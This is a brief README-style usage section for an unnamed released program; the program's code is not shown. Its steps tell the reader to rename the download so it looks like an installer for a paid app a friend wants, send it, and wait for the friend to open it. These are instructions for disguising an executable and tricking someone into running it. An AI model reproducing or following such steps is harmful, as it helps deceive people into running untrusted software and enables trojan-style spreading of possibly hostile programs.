How to use:

1. Go to Release, download the latest version

2. Since the name maybe suspicious, so after download it, ***change the filename to something else***. For example, if your friend want some paid apps but he can't buy it at this moment, then name it to "*xxxx_installer*" (where *xxxx* is the app name).

3. Send it to him/her and wait for him to open!
